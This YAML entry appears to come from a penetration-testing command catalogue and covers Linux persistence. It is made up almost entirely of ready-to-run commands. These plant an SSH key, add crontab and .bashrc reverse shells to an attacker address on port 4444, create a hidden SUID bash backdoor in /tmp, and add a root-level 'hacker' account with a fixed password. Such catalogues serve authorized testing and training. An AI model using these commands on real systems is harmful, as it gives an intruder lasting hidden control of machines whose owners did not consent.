---
description: |
  Linux persistence techniques — SSH key planting, crontab reverse shells, bashrc modification, SUID backdoors, and user creation.
commands:
  - have: Shell
    cmd: |
      # --- SSH key persistence ---
      # Generate a key pair on attacker
      ssh-keygen -t rsa -f /tmp/persistence_key -N ""

      # Copy public key to target authorized_keys
      mkdir -p /home/sec_user/.ssh
      echo "ssh-rsa AAAA...your_pub_key..." >> /home/sec_user/.ssh/authorized_keys
      chmod 700 /home/sec_user/.ssh
      chmod 600 /home/sec_user/.ssh/authorized_keys

      # Login from attacker
      ssh -i /tmp/persistence_key sec_user@10.10.10.27

      # --- Crontab reverse shell ---
      (crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/10.10.10.21/4444 0>&1") | crontab -

      # --- .bashrc modification ---
      echo 'bash -i >& /dev/tcp/10.10.10.21/4444 0>&1 &' >> /home/sec_user/.bashrc

      # --- SUID backdoor ---
      cp /bin/bash /tmp/.backdoor
      chmod +s /tmp/.backdoor
      # Execute with: /tmp/.backdoor -p

      # --- Add user with root privileges ---
      # Add to /etc/passwd (if writable)
      openssl passwd -1 P@ssw0rd
      echo 'hacker:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

      # Or use useradd (if root)
      useradd -m -s /bin/bash -G sudo hacker
      echo 'hacker:P@ssw0rd' | chpasswd
phase:
  - Persistence
target_os:
  - Linux
services: []
techniques: []
references:
  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
---
